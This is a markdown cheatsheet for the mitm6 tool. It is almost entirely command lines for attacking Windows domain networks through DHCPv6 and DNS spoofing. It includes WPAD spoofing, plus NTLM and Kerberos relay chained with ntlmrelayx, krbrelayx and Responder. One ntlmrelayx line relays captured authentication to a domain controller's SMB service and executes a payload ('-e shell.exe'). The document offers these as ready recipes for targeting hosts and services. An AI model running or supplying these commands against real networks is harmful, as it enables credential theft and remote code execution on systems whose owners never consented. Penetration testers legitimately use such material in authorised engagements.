# mitm6 Cheatsheet

## Quick Start

```bash
# Basic DNS spoofing
mitm6 -d target.local

# Verbose mode
mitm6 -v -d target.local

# With relay target
mitm6 -r attacker.local -d target.local
```

## Essential Commands

```bash
# Start mitm6 with specific interface
mitm6 -i eth0 -d corp.example.com

# Filter by hostname pattern
mitm6 -hw "WORKSTATION-*" -d target.local

# Block specific domains
mitm6 -d target.local -b internal.corp -b staging.corp

# Disable Router Advertisements
mitm6 --no-ra -d target.local

# Ignore non-FQDN queries
mitm6 --ignore-nofqdn -d target.local
```

## Attack Scenarios

### WPAD Spoofing

```bash
# Terminal 1: mitm6
mitm6 -d target.local

# Terminal 2: ntlmrelayx
ntlmrelayx.py -6 -wh WPAD-ATTACKER -t smb://dc.target.local
```

### Kerberos Relay

```bash
# Terminal 1: krbrelayx
krbrelayx.py -t dc.target.local

# Terminal 2: mitm6
mitm6 --relay dc.target.local -d target.local
```

### Network Reconnaissance

```bash
# Capture all traffic with verbose output
mitm6 -v --debug -d target.local 2>&1 | tee recon.log

# Filter specific hosts
mitm6 -hw "SERVER-*" -v -d target.local
```

## Filtering Options

```bash
# Domain allowlist (spoof only these)
mitm6 -d corp.local -d dev.local

# Domain blocklist (never spoof these)
mitm6 -d corp.local -b staging.corp -b test.corp

# Host allowlist (only target these hosts)
mitm6 -hw "WS-*" -hw "LAPTOP-*"

# Host blocklist (never target these)
mitm6 -hb "DC-*" -hb "SERVER-*"
```

## Integration Commands

### With ntlmrelayx

```bash
# Full NTLM relay setup
ntlmrelayx.py -6 -wh WPAD-ATTACKER -t smb://dc.target.local -e shell.exe
mitm6 -d target.local
```

### With krbrelayx

```bash
# Kerberos relay setup
krbrelayx.py -t dc.target.local -ip attacker.local
mitm6 --relay dc.target.local -d target.local
```

### With Responder

```bash
# Combined LLMNR/NBT-NS + DHCPv6 attack
responder -I eth0 -wrf
mitm6 -i eth0 -d target.local
```

## Debugging

```bash
# Full debug output
mitm6 --debug -d target.local 2>&1 | tee debug.log

# Check IPv6 addresses
ip -6 addr show

# Verify interface is receiving traffic
tcpdump -i eth0 port 547

# Monitor DNS queries
tcpdump -i eth0 port 53
```

## Output Analysis

### Log File Formats

- DHCPv6 requests with FQDN (hostname)
- DNS queries with requested domains
- DNS responses with spoofed IPs
- Connection attempts from victims

### Key Indicators

- Victim hostname from DHCPv6 FQDN option
- Domain names being resolved
- Services being accessed via spoofed DNS
- Authentication attempts (NTLM/Kerberos)

## Common Patterns

### Target Specific Services

```bash
# Only spoof file server DNS
mitm6 -d fileserver.corp.local -v

# Only spoof web applications
mitm6 -d webapp.corp.local -d mail.corp.local
```

### Large Network Scan

```bash
# Capture all DHCPv6 queries
mitm6 -v --debug 2>&1 | tee full_scan.log

# Filter by workstation naming convention
mitm6 -hw "WS-*" -hw "PC-*" -v
```

## Cleanup

```bash
# mitm6 auto-cleans:
# - DNS replies expire in 100 seconds
# - DHCPv6 leases expire in 5 minutes
# - No persistent changes to victim

# Manual verification
ip -6 route show
cat /etc/resolv.conf
```
